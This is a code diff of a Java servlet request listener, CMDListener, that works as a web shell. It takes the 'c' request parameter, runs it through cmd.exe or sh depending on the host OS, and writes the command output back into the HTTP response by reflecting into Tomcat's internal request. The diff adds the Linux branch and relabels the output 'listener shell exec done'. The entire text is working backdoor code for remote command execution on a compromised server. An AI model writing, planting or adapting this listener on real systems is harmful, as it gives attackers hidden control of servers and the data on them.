@@ -20,8 +20,15 @@ public class CMDListener implements ServletRequestListener {
         HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequestEvent.getServletRequest();
         try {
             if (httpServletRequest.getParameter("c") != null) {
-                String cmd = httpServletRequest.getParameter("c");
-                InputStream inputStream = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd}).getInputStream();
+//                String cmd = httpServletRequest.getParameter("c");
+                String[] cmd = null;
+                String os = System.getProperty("os.name");
+                if(os.toLowerCase().startsWith("windows")){
+                    cmd = new String[]{"cmd.exe", "/c",httpServletRequest.getParameter("c")};
+                }else {
+                    cmd = new String[]{"sh", "-c",httpServletRequest.getParameter("c")};
+                }
+                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                 Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
                 String output = scanner.hasNext()?scanner.next():"";
                 Field requestField = httpServletRequest.getClass().getDeclaredField("request");
@@ -29,7 +36,7 @@ public class CMDListener implements ServletRequestListener {
                 Request request = (Request) requestField.get(httpServletRequest);
                 request.getResponse().getWriter().write(output);
                 request.getResponse().getWriter().write("\n");
-                request.getResponse().getWriter().write("done\n");
+                request.getResponse().getWriter().write("listener shell exec done\n");
                 request.getResponse().getWriter().flush();
             }
 
